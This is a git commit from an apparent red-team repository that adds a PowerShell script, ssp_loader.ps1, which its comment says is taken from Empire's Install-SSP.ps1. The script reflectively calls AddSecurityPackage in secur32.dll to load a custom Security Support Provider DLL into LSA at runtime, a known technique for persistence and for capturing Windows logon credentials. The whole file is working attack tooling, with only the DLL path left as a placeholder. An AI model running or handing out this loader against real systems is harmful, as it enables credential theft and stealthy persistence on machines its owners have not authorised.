b004349efa4d409f0ccb2578b96d34094a5a5e4e
2XXE (SRA) <40869774+2XXE-SRA@users.noreply.github.com>
2023-12-05 16:13:53 -0500

    Create ssp_loader.ps1

---
+++ powershell/ssp_loader.ps1
@@ -0,0 +1,30 @@
+# lsa ssp loader ripped from Empire's Instal-SSP.ps1 
+
+$DynAssembly = New-Object System.Reflection.AssemblyName('SSPI2')
+$AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
+$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('SSPI2', $False)
+
+$TypeBuilder = $ModuleBuilder.DefineType('SSPI2.Secur32', 'Public, Class')
+$PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('AddSecurityPackage',
+    'secur32.dll',
+    'Public, Static',
+    [Reflection.CallingConventions]::Standard,
+    [Int32],
+    [Type[]] @([String], [IntPtr]),
+    [Runtime.InteropServices.CallingConvention]::Winapi,
+    [Runtime.InteropServices.CharSet]::Auto)
+
+$Secur32 = $TypeBuilder.CreateType()
+
+if ([IntPtr]::Size -eq 4) {
+    $StructSize = 20
+} else {
+    $StructSize = 24
+}
+
+$StructPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($StructSize)
+[Runtime.InteropServices.Marshal]::WriteInt32($StructPtr, $StructSize)
+
+$DllName = "<path to ssp goes here>"
+$Secur32::AddSecurityPackage($DllName, $StructPtr)
+
